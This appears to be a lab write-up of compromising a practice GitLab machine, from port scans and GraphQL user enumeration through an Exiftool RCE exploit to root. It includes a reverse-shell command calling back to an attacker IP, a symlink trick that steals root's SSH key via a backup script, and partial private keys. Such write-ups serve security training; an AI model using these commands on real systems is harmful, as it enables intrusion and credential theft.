# Breakout

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.182
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-12 15:28 +08
Warning: 192.168.183.182 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.183.182
Host is up (0.17s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

### Web Enum --> GraphQL

Port 80 reveals a Gitlab instance:

<figure><img src="../../../.gitbook/assets/image (2899).png" alt=""><figcaption></figcaption></figure>

I tried registering a user, but it wasn't allowed since the Gitlab administrator needed to approve first. I ran a `feroxbuster` scan to enumerate directories.&#x20;

```
$ feroxbuster -u http://192.168.183.182
200      GET      264l     1543w        0c http://192.168.183.182/search
200      GET      353l     2789w        0c http://192.168.183.182/help
301      GET        1l        5w       98c http://192.168.183.182/profile => http://192.168.183.182/-/profile
200      GET      363l     1838w        0c http://192.168.183.182/public
302      GET        1l        5w      105c http://192.168.183.182/snippets => http://192.168.183.182/explore/snippets
302      GET        1l        5w       96c http://192.168.183.182/projects => http://192.168.183.182/explore
401      GET        0l        0w        0c http://192.168.183.182/v2
302      GET        1l        5w      103c http://192.168.183.182/groups => http://192.168.183.182/explore/groups
200      GET      441l     2057w        0c http://192.168.183.182/webmaster
200      GET      441l     2057w        0c http://192.168.183.182/root
200      GET      363l     1838w        0c http://192.168.183.182/explore
```

There wasn't much from this though. I searched for Gitlab enumeration, hoping to get someone'e cheatsheet on how to enumerate Gitlab instances, but found this instead:

{% embed url="https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/" %}

I tried their PoC of accessing Gitlab using `/-/graphql-explorer`, and it worked:

<figure><img src="../../../.gitbook/assets/image (1538).png" alt=""><figcaption></figcaption></figure>

### GraphQL User Enum  --> User Login

The CVE above mentions that this allows us to enumerate users using this query:

```
{users{nodes{id name username}}}
```

<figure><img src="../../../.gitbook/assets/image (1528).png" alt=""><figcaption></figcaption></figure>

We have 2 new users, `coaran` and `michelle`. Then, we can login with `michelle:michelle`:

<figure><img src="../../../.gitbook/assets/image (2130).png" alt=""><figcaption></figcaption></figure>

### Gitlab RCE

Using this user, we can enumerate the version of Gitlab running:

<figure><img src="../../../.gitbook/assets/image (1309).png" alt=""><figcaption></figcaption></figure>

This is vulnerable to the Gitlab Exiftool RCE exploit.&#x20;

{% embed url="https://github.com/CsEnox/Gitlab-Exiftool-RCE" %}

```
$ python3 exploit.py -u michelle -p michelle -c "bash -c 'bash -i >& /dev/tcp/192.168.45.208/4444 0>&1'" -t http://192.168.183.182
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
```

<figure><img src="../../../.gitbook/assets/image (3240).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### LinPEAS --> SSH Key

I ran `linpeas.sh` and it found some potential SSH keys.&#x20;

```
[+] Searching ssl/ssh files
ChallengeResponseAuthentication no                                                           
UsePAM yes
Possible private SSH keys were found!
/var/opt/gitlab/backups/mykey
/var/opt/gitlab/gitlab-rails/etc/secrets.yml
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow
```

We can read the file and verify that it is an SSH key:

```
git@breakout:/tmp$ cat /var/opt/gitlab/backups/mykey 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA4eDGWPfq/wKo4whXeFRr8Dq+wgoCClqpJmxRajPmCaSrULo/uPad
<TRUNCATED>
```

We know that there are 2 users on the machine, and I tested with both. Using this key, we can `ssh` in as `coaron`:

<figure><img src="../../../.gitbook/assets/image (3590).png" alt=""><figcaption></figcaption></figure>

### Pspy --> Symlink Exploit

`linpeas.sh` didn't reveal much, so I ran a `pspy64` instead. I found some interesting processes involving zip files:

{% code overflow="wrap" %}
```
2023/07/12 07:46:01 CMD: UID=0    PID=320345 | bash /opt/backups/backup.sh 
2023/07/12 07:46:01 CMD: UID=0    PID=320346 | /usr/bin/zip -r /opt/backups/log_backup.zip /srv/gitlab/logs/alertmanager /srv/gitlab/logs/gitaly /srv/gitlab/logs/gitlab-exporter /srv/gitlab/logs/gitlab-rails /srv/gitlab/logs/gitlab-shell /srv/gitlab/logs/gitlab-workhorse /srv/gitlab/logs/grafana /srv/gitlab/logs/logrotate /srv/gitlab/logs/nginx /srv/gitlab/logs/postgres-exporter /srv/gitlab/logs/postgresql /srv/gitlab/logs/prometheus /srv/gitlab/logs/puma /srv/gitlab/logs/reconfigure /srv/gitlab/logs/redis /srv/gitlab/logs/redis-exporter /srv/gitlab/logs/sidekiq /srv/gitlab/logs/sshd

coaran@breakout:/tmp$ cat /opt/backups/backup.sh 
/usr/bin/zip -r /opt/backups/log_backup.zip /srv/gitlab/logs/*
```
{% endcode %}

Since this is being run by root, we can create a symlink here that points towards the `root` user's private SSH key. However, we cannot view the files or write to it as `coaron`, but it seems the `git` user can on the Docker container its in.

```
git@breakout:/srv$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0 55.5M  1 loop 
loop1    7:1    0 55.5M  1 loop 
loop2    7:2    0 61.9M  1 loop 
loop3    7:3    0 61.9M  1 loop 
loop4    7:4    0 43.6M  1 loop 
loop5    7:5    0 67.2M  1 loop 
loop6    7:6    0 67.9M  1 loop 
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0    1M  0 part 
└─sda2   8:2    0   10G  0 part /var/log/gitlab
sr0     11:0    1 1024M  0 rom

git@breakout:/var/log/gitlab$ ls -la
total 80
drwxr-xr-x 20 root              root       4096 Mar  3  2022 .
drwxr-xr-x  1 root              root       4096 Feb 23  2021 ..
drwx------  2 gitlab-prometheus root       4096 Feb 17 17:18 alertmanager
drwx------  2 git               root       4096 Jul 12 07:37 gitaly
drwx------  2 git               root       4096 Jul 12 07:28 gitlab-exporter
drwx------  2 git               root       4096 Jul 12 07:38 gitlab-rails
drwx------  2 git               root       4096 Mar  3  2022 gitlab-shell
drwx------  2 git               root       4096 Jul 12 07:28 gitlab-workhorse
drwx------  2 gitlab-prometheus root       4096 Feb 17 17:18 grafana
drwx------  2 root              root       4096 Jan 30 10:45 logrotate
drwxr-x---  2 root              gitlab-www 4096 Feb 17 00:28 nginx
drwx------  2 gitlab-psql       root       4096 Feb 17 17:18 postgres-exporter
drwx------  2 gitlab-psql       root       4096 Feb 17 17:18 postgresql
drwx------  2 gitlab-prometheus root       4096 Jul 12 07:28 prometheus
drwx------  2 git               root       4096 Feb 17 17:18 puma
drwxr-xr-x  2 root              root       4096 Feb 16 17:18 reconfigure
drwx------  2 gitlab-redis      root       4096 Jul 12 07:27 redis
drwx------  2 gitlab-redis      root       4096 Feb 17 17:18 redis-exporter
drwx------  2 git               root       4096 Jul 12 07:27 sidekiq
drwxr-xr-x  2 root              root       4096 Jan 30 10:45 sshd
```

We can then create the symlink here:

```
git@breakout:/var/log/gitlab/gitaly$ ln -s /root/.ssh/id_rsa test1
```

Afterwards, we just need to wait for a bit before the script executes and makes a new zip file in `/opt/backups`. Once it does, copy the folder elsewhere and unzip it to reveal the SSH private key of `root`:

```
coaran@breakout:/dev/shm/srv/gitlab/logs/gitaly$ cat test1
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzAu+X5sUIUBGFen/rkbr6M09cLPZvlsrphqkjcZQ48zivybhHMIJ
<TRUNCATED>
```

We can then use this key to `ssh` in as `root`:

<figure><img src="../../../.gitbook/assets/image (2601).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
